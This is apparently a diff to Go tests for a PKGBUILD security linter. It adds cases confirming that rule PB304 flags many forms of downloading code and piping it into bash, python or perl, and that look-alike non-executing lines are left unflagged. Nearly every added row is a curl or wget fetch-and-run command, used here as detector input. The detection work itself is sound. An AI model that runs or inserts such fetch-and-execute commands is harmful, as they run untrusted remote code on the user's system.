@@ -1721,6 +1721,50 @@ build() {
 }`)})
 		}
 	})
+	t.Run("PB304 equivalent download-into-interpreter shapes", func(t *testing.T) {
+		// Each row runs the downloaded code exactly as `curl … | bash` does;
+		// a one-token rewrite of the sink must not lose the finding.
+		for _, line := range []string{
+			"curl -s https://example.com/x | bash",
+			"curl -s https://example.com/x | bash /dev/stdin",
+			"bash < <(curl -s https://example.com/x)",
+			"bash 0< <(curl -s https://example.com/x)",
+			`bash <<< "$(curl -s https://example.com/x)"`,
+			"bash <<EOF\n$(curl -s https://example.com/x)\nEOF",
+			"python3 < <(curl -s https://example.com/x)",
+			"curl -s https://example.com/x | (bash)",
+			"curl -s https://example.com/x | { bash; }",
+			"curl -s https://example.com/x | (cd /tmp && bash)",
+			"curl -s https://example.com/x | python3.12 -",
+			"curl -s https://example.com/x | python3.12",
+			"curl -s https://example.com/x | perl5.38",
+			"curl -s https://example.com/x | python3 -W ignore -",
+			"curl -s https://example.com/x | python3 -X dev",
+			"wget -qO- https://example.com/x | base64 -d | (sh)",
+		} {
+			t.Run(line, func(t *testing.T) {
+				expectRule(t, "PB304", map[string]string{"PKGBUILD": pkgbuildWith("", "\nbuild() {\n"+line+"\n}")})
+			})
+		}
+		expectRule(t, "PB303", map[string]string{"PKGBUILD": pkgbuildWith("", `
+build() {
+  echo "$p" | base64 -d | (sh)
+}`)})
+	})
+	t.Run("PB304 equivalent shapes that are not execution", func(t *testing.T) {
+		for _, line := range []string{
+			"curl -s https://example.com/v.json | python3.12 -m json.tool",
+			`curl -s https://example.com/v.json | python3 -W ignore -c "import sys,json; print(json.load(sys.stdin)['v'])"`,
+			"bash < ./build.sh",
+			"bash <<'EOF'\n$(curl -s https://example.com/x)\nEOF",
+			"curl -s https://example.com/x | (cat > out.txt)",
+			`curl -s https://example.com/x >out.txt; bash <<< "echo hi"`,
+		} {
+			t.Run(line, func(t *testing.T) {
+				expectNoRule(t, "PB304", map[string]string{"PKGBUILD": pkgbuildWith("", "\nbuild() {\n"+line+"\n}")})
+			})
+		}
+	})
 	t.Run("PB305 dev tcp", func(t *testing.T) {
 		expectRule(t, "PB305", map[string]string{"PKGBUILD": pkgbuildWith("", `
 build() {
